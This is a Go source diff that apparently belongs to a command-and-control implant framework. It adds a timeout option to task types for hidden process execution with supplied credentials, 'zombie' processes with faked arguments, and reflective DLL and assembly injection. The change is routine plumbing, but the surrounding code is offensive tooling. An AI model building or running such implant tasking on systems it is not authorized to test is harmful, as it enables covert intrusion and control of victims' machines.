@@ -117,6 +117,7 @@ var (
 		val.Validator{Name: "pass", Type: val.String, Optional: true},
 		val.Validator{Name: "stdin", Type: val.String, Optional: true},
 		val.Validator{Name: "domain", Type: val.String, Optional: true},
+		val.Validator{Name: "timeout", Type: val.String, Optional: true},
 		val.Validator{Name: "cmd", Type: val.String, Rules: val.Rules{val.NoEmpty}},
 		valFilter,
 	}
@@ -298,11 +299,12 @@ type taskCommand struct {
 	taskExecute
 }
 type taskExecute struct {
-	_      [0]func()
-	Filter *filter.Filter `json:"filter"`
-	Line   string         `json:"line"`
-	Show   taskBool       `json:"show"`
-	Detach taskBool       `json:"detach"`
+	_       [0]func()
+	Filter  *filter.Filter `json:"filter"`
+	Line    string         `json:"line"`
+	Show    taskBool       `json:"show"`
+	Detach  taskBool       `json:"detach"`
+	Timeout string         `json:"timeout"`
 }
 type taskAssembly struct {
 	Line  string `json:"line"`
@@ -460,27 +462,37 @@ func (t taskNetcat) Packet() (*com.Packet, error) {
 	return task.Netcat(t.Host, p, time.Second*time.Duration(t.Seconds), t.Read, t.Data), nil
 }
 func (t taskZombie) Packet() (*com.Packet, error) {
+	d, err := parseDuration(t.Timeout, false)
+	if err != nil {
+		return nil, err
+	}
 	return (task.Zombie{
-		Data:   cmd.DLLToASM(t.Entry, t.Data),
-		Args:   cmd.Split(t.Fake),
-		Hide:   t.Show != boolTrue,
-		Wait:   t.Detach != boolTrue,
-		User:   t.User,
-		Pass:   t.Pass,
-		Stdin:  t.Stdin,
-		Domain: t.Domain,
-		Filter: t.Filter,
+		Data:    cmd.DLLToASM(t.Entry, t.Data),
+		Args:    cmd.Split(t.Fake),
+		Hide:    t.Show != boolTrue,
+		Wait:    t.Detach != boolTrue,
+		User:    t.User,
+		Pass:    t.Pass,
+		Stdin:   t.Stdin,
+		Domain:  t.Domain,
+		Filter:  t.Filter,
+		Timeout: d,
 	}).Packet()
 }
 func (t taskCommand) Packet() (*com.Packet, error) {
+	d, err := parseDuration(t.Timeout, false)
+	if err != nil {
+		return nil, err
+	}
 	p := task.Process{
-		Hide:   t.Show != boolTrue,
-		Wait:   t.Detach != boolTrue,
-		User:   t.User,
-		Pass:   t.Pass,
-		Stdin:  t.Stdin,
-		Domain: t.Domain,
-		Filter: t.Filter,
+		Hide:    t.Show != boolTrue,
+		Wait:    t.Detach != boolTrue,
+		User:    t.User,
+		Pass:    t.Pass,
+		Stdin:   t.Stdin,
+		Domain:  t.Domain,
+		Filter:  t.Filter,
+		Timeout: d,
 	}
 	if len(t.Command) == 0 && len(t.Stdin) == 0 {
 		return nil, errInvalidCommand
@@ -617,13 +629,17 @@ func (t taskSpawn) Callable() (task.Callable, error) {
 	return nil, errInvalidMethod
 }
 func (t taskDLL) Callable() (callableTasklet, error) {
+	d, err := parseDuration(t.Timeout, false)
+	if err != nil {
+		return nil, err
+	}
 	if len(t.Path) > 0 {
-		return task.DLL{Path: t.Path, Wait: t.Detach != boolTrue, Filter: t.Filter}, nil
+		return task.DLL{Path: t.Path, Wait: t.Detach != boolTrue, Filter: t.Filter, Timeout: d}, nil
 	}
 	if t.Reflect == boolTrue {
-		return task.Assembly{Data: cmd.DLLToASM(t.Entry, t.Data), Wait: t.Detach != boolTrue, Filter: t.Filter}, nil
+		return task.Assembly{Data: cmd.DLLToASM(t.Entry, t.Data), Wait: t.Detach != boolTrue, Filter: t.Filter, Timeout: d}, nil
 	}
-	return task.DLL{Data: t.Data, Wait: t.Detach != boolTrue, Filter: t.Filter}, nil
+	return task.DLL{Data: t.Data, Wait: t.Detach != boolTrue, Filter: t.Filter, Timeout: d}, nil
 }
 func (t taskWorkHours) Packet() (*com.Packet, error) {
 	d, err := parseDayString(t.Days)
